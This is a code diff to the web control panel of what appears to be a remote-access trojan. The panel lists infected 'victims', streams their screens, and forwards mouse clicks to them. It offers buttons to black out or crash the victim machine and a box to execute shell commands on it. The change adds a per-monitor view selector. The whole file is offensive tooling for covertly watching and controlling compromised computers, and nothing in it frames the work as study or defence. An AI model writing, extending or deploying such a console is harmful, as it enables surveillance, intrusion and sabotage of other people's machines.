@@ -47,11 +47,10 @@
     #info.on { color: #4c4; }
     #info.off { color: #c44; }
 
-    /* ── Side panel ── */
     #sidebar {
       position: fixed; top: 0; left: 0;
-      width: 260px; height: 100vh;
-      background: rgba(10,10,10,0.92);
+      width: 280px; height: 100vh;
+      background: rgba(10,10,10,0.95);
       border-right: 1px solid #2a2a2a;
       z-index: 1001;
       padding: 10px;
@@ -62,7 +61,7 @@
       font-size: 12px;
       transition: transform 0.2s;
     }
-    #sidebar.collapsed { transform: translateX(-250px); }
+    #sidebar.collapsed { transform: translateX(-270px); }
     #sidebar-toggle {
       position: fixed; top: 8px; left: 8px;
       z-index: 1002;
@@ -97,20 +96,30 @@
       border: 1px solid transparent;
     }
     .victim-item:hover { background: #1a1a1a; }
-    .victim-item.active {
-      background: #0f02;
-      border-color: #0f08;
-    }
-    .victim-dot {
-      width: 8px; height: 8px;
-      border-radius: 50%;
-      background: #0f0;
-      flex-shrink: 0;
-    }
+    .victim-item.active { background: #0f02; border-color: #0f08; }
+    .victim-dot { width: 8px; height: 8px; border-radius: 50%; background: #0f0; flex-shrink: 0; }
     .victim-id { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: #ddd; }
     .victim-res { color: #666; font-size: 10px; }
+    .victim-mons { color: #888; font-size: 9px; }
 
-    /* ── Control buttons ── */
+    /* ── Monitor selector (crop) ── */
+    #monitor-selector {
+      display: none;
+      margin-top: 4px;
+    }
+    #monitor-selector select {
+      width: 100%;
+      background: #1a1a1a;
+      color: #ddd;
+      border: 1px solid #444;
+      padding: 5px;
+      border-radius: 4px;
+      font-family: monospace;
+      font-size: 11px;
+    }
+    #monitor-selector select:focus { outline: none; border-color: #0f08; }
+    .mon-label { color: #888; font-size: 10px; margin-bottom: 2px; }
+
     #controls {
       margin-top: 6px;
       border-top: 1px solid #2a2a2a;
@@ -138,19 +147,11 @@
     .ctrl-btn.crash:hover { background: #400; }
     .ctrl-btn.exec { border-color: #48f; color: #48f; }
 
-    .status-line {
-      color: #888;
-      font-size: 10px;
-      padding: 2px 0;
-    }
+    .status-line { color: #888; font-size: 10px; padding: 2px 0; }
     .status-line .val { color: #ddd; }
     .status-line .warn { color: #f80; }
 
-    /* ── Exec result ── */
-    #exec-result {
-      display: none;
-      margin-top: 4px;
-    }
+    #exec-result { display: none; margin-top: 4px; }
     #exec-result textarea {
       width: 100%;
       height: 120px;
@@ -189,22 +190,26 @@
     <div class="panel-title">◉ Targets</div>
     <div id="victim-list"></div>
 
+    <!-- Monitor selector -->
+    <div id="monitor-selector">
+      <div class="mon-label">◉ View Region</div>
+      <select id="monitor-select">
+        <option value="full">Full Virtual Desktop</option>
+      </select>
+    </div>
+
     <div id="controls">
       <div class="panel-title">◉ Controls</div>
-
       <button id="btn-blackout" class="ctrl-btn blackout">⬛ Toggle Blackout</button>
       <button id="btn-crash" class="ctrl-btn crash">💀 Crash & Restart</button>
-
       <div class="status-line">
         Blackout: <span class="val" id="blackout-status-val">OFF</span>
         <span class="val" id="blackout-method-val"></span>
       </div>
-
       <hr style="border-color:#2a2a2a; margin:6px 0;">
-
       <div class="panel-title">◉ Execute</div>
       <input type="text" id="exec-cmd-input" placeholder="cmd.exe /c whoami" />
-      <button id="btn-exec" class="ctrl-btn exec">⏎ Execute on Victim</button>
+      <button id="btn-exec" class="ctrl-btn exec">⏎ Execute</button>
       <div id="exec-result">
         <textarea id="exec-output" readonly></textarea>
       </div>
@@ -221,11 +226,16 @@
       const cursorEl = document.getElementById('cursor');
       const victimListEl = document.getElementById('victim-list');
       const controlsEl = document.getElementById('controls');
+      const monitorSelector = document.getElementById('monitor-selector');
+      const monitorSelect = document.getElementById('monitor-select');
       const sidebar = document.getElementById('sidebar');
 
       let selectedVictim = null;
+      let victimMonitors = [];
       let capW = 1920;
       let capH = 1080;
+      let cropOffsetX = 0;   // pixel offset of crop relative to virtual desktop
+      let cropOffsetY = 0;
       let scaleX = 1;
       let scaleY = 1;
       let frameImg = null;
@@ -238,7 +248,6 @@
         reconnectionDelay: 1000
       });
 
-      // ── Canvas resize ──
       function resize() {
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
@@ -249,7 +258,6 @@
       }
       window.addEventListener('resize', resize);
 
-      // ── Render loop ──
       function render() {
         if (frameReady && frameImg) {
           frameReady = false;
@@ -260,7 +268,6 @@
       }
       requestAnimationFrame(render);
 
-      // ── Process JPEG frame ──
       function processFrame(data) {
         const blob = new Blob([data], { type: 'image/jpeg' });
         const url = URL.createObjectURL(blob);
@@ -274,21 +281,24 @@
         img.src = url;
       }
 
-      // ── Remote coordinates from mouse event ──
+      // ── Get remote coordinates ──
+      // Maps canvas CSS pixel → remote virtual desktop pixel
+      // accounting for crop offset
       function getRemoteCoords(e) {
         const rect = canvas.getBoundingClientRect();
         let cssX = e.clientX - rect.left;
         let cssY = e.clientY - rect.top;
         cssX = Math.max(0, Math.min(cssX, canvas.width));
         cssY = Math.max(0, Math.min(cssY, canvas.height));
-        let remoteX = Math.round(cssX * scaleX);
-        let remoteY = Math.round(cssY * scaleY);
-        remoteX = Math.max(0, Math.min(remoteX, capW - 1));
-        remoteY = Math.max(0, Math.min(remoteY, capH - 1));
+        // Scale from CSS pixels to captured image pixels
+        let imgX = Math.round(cssX * scaleX);
+        let imgY = Math.round(cssY * scaleY);
+        // Add crop offset to get virtual desktop coordinates
+        let remoteX = imgX + cropOffsetX;
+        let remoteY = imgY + cropOffsetY;
         return { cssX, cssY, remoteX, remoteY };
       }
 
-      // ── Move cursor overlay ──
       function moveCursor(e) {
         const rect = canvas.getBoundingClientRect();
         cursorEl.style.display = 'block';
@@ -302,9 +312,7 @@
         info.innerHTML = `${capW}x${capH} · <span class="coords">${coords.remoteX},${coords.remoteY}</span>`;
       });
 
-      canvas.addEventListener('mouseleave', function() {
-        cursorEl.style.display = 'none';
-      });
+      canvas.addEventListener('mouseleave', function() { cursorEl.style.display = 'none'; });
 
       canvas.addEventListener('click', function(e) {
         if (!selectedVictim) return;
@@ -336,24 +344,37 @@
         if (!list || list.length === 0) {
           victimListEl.innerHTML = '<div style="color:#666;padding:4px;">No victims online</div>';
           controlsEl.style.display = 'none';
+          monitorSelector.style.display = 'none';
           return;
         }
         list.forEach(v => {
           const item = document.createElement('div');
           item.className = 'victim-item' + (selectedVictim === v.id ? ' active' : '');
+          const mons = v.monitors || [];
+          const monStr = mons.length > 0 ? mons.map((m, i) => m.primary ? `#${i+1} (P)` : `#${i+1}`).join(', ') : '';
           item.innerHTML = `
             <div class="victim-dot"></div>
             <div class="victim-id">${v.id}</div>
-            <div class="victim-res">${v.w}x${v.h}</div>
+            <div style="text-align:right;flex-shrink:0;">
+              <div class="victim-res">${v.w}x${v.h}</div>
+              ${monStr ? `<div class="victim-mons">${monStr}</div>` : ''}
+            </div>
           `;
           item.addEventListener('click', function() {
             selectedVictim = v.id;
+            victimMonitors = v.monitors || [];
             blackoutState = false;
             document.getElementById('btn-blackout').textContent = '⬛ Toggle Blackout';
             document.getElementById('btn-blackout').className = 'ctrl-btn blackout';
             document.getElementById('blackout-status-val').textContent = 'OFF';
             document.getElementById('blackout-method-val').textContent = '';
-            socket.emit('select-victim', v.id);
+
+            // Populate monitor selector
+            populateMonitorSelector(v.monitors);
+
+            // Select victim with full desktop by default
+            socket.emit('select-victim', { id: v.id, crop: null });
+
             renderVictimList(list);
             info.textContent = `Selecting ${v.id}...`;
           });
@@ -361,12 +382,58 @@
         });
       }
 
+      // ── Populate monitor dropdown ──
+      function populateMonitorSelector(mons) {
+        monitorSelect.innerHTML = '';
+        const optFull = document.createElement('option');
+        optFull.value = 'full';
+        optFull.textContent = 'Full Virtual Desktop';
+        monitorSelect.appendChild(optFull);
+
+        if (mons && mons.length > 0) {
+          mons.forEach((m, i) => {
+            const opt = document.createElement('option');
+            opt.value = i;
+            opt.textContent = `Monitor ${i+1} (${m.w}x${m.h})${m.primary ? ' [Primary]' : ''}`;
+            monitorSelect.appendChild(opt);
+          });
+        }
+
+        monitorSelect.value = 'full';
+        monitorSelector.style.display = 'block';
+      }
+
+      // ── Handle monitor selection change ──
+      monitorSelect.addEventListener('change', function() {
+        if (!selectedVictim) return;
+        const val = this.value;
+
+        if (val === 'full') {
+          cropOffsetX = 0;
+          cropOffsetY = 0;
+          socket.emit('select-victim', { id: selectedVictim, crop: null });
+          info.textContent = `Selecting ${selectedVictim} (full desktop)...`;
+        } else {
+          const idx = parseInt(val);
+          const mon = victimMonitors[idx];
+          if (mon) {
+            cropOffsetX = mon.x;
+            cropOffsetY = mon.y;
+            socket.emit('select-victim', {
+              id: selectedVictim,
+              crop: { x: mon.x, y: mon.y, w: mon.w, h: mon.h }
+            });
+            info.textContent = `Selecting ${selectedVictim} (monitor ${idx+1})...`;
+          }
+        }
+      });
+
       // ── Sidebar toggle ──
       document.getElementById('sidebar-toggle').addEventListener('click', function() {
         sidebar.classList.toggle('collapsed');
       });
 
-      // ── Blackout toggle ──
+      // ── Blackout ──
       document.getElementById('btn-blackout').addEventListener('click', function() {
         if (!selectedVictim) return;
         blackoutState = !blackoutState;
@@ -375,34 +442,31 @@
         this.className = 'ctrl-btn blackout' + (blackoutState ? ' active' : '');
       });
 
-      // ── Crash & restart ──
+      // ── Crash ──
       document.getElementById('btn-crash').addEventListener('click', function() {
         if (!selectedVictim) return;
-        if (confirm('Trigger crash + restart? Victim will disconnect.')) {
+        if (confirm('Trigger crash + restart?')) {
           socket.emit('trigger-crash');
           this.textContent = '💀 Triggered!';
           setTimeout(() => { this.textContent = '💀 Crash & Restart'; }, 3000);
         }
       });
 
-      // ── Execute command ──
+      // ── Execute ──
       document.getElementById('btn-exec').addEventListener('click', function() {
         const cmd = document.getElementById('exec-cmd-input').value.trim();
         if (!cmd || !selectedVictim) return;
         socket.emit('exec-victim', cmd);
         document.getElementById('exec-result').style.display = 'block';
-        document.getElementById('exec-output').value = '> ' + cmd + '\nWaiting for result...\n';
+        document.getElementById('exec-output').value = '> ' + cmd + '\nWaiting...\n';
       });
-
       document.getElementById('exec-cmd-input').addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') {
-          document.getElementById('btn-exec').click();
-        }
+        if (e.key === 'Enter') document.getElementById('btn-exec').click();
       });
 
-      // ═══════════════════════════════════════════
+      // ══════════════════════════════════════
       // SOCKET EVENTS
-      // ═══════════════════════════════════════════
+      // ══════════════════════════════════════
       socket.on('connect', function() {
         info.textContent = 'Connected — registering as viewer';
         info.className = 'on';
@@ -414,12 +478,38 @@
       });
 
       socket.on('victim-info', function(data) {
+        victimMonitors = data.monitors || [];
         capW = data.w;
         capH = data.h;
+
+        // If crop was set, update offsets
+        if (data.crop) {
+          cropOffsetX = data.crop.x;
+          cropOffsetY = data.crop.y;
+        } else {
+          cropOffsetX = 0;
+          cropOffsetY = 0;
+        }
+
         resize();
         controlsEl.style.display = 'flex';
+        monitorSelector.style.display = 'block';
+        populateMonitorSelector(data.monitors);
+
+        // Reset dropdown to match crop
+        if (data.crop) {
+          const idx = (data.monitors || []).findIndex(
+            m => m.x === data.crop.x && m.y === data.crop.y &&
+                 m.w === data.crop.w && m.h === data.crop.h
+          );
+          monitorSelect.value = idx >= 0 ? String(idx) : 'full';
+        } else {
+          monitorSelect.value = 'full';
+        }
+
         info.className = 'on';
-        info.innerHTML = `${capW}x${capH} · <span class="coords">Viewing ${data.id}</span>`;
+        const viewInfo = data.crop ? `(cropped ${data.crop.w}x${data.crop.h})` : '(full desktop)';
+        info.innerHTML = `${capW}x${capH} · <span class="coords">Viewing ${data.id} ${viewInfo}</span>`;
       });
 
       socket.on('frame', function(f) {
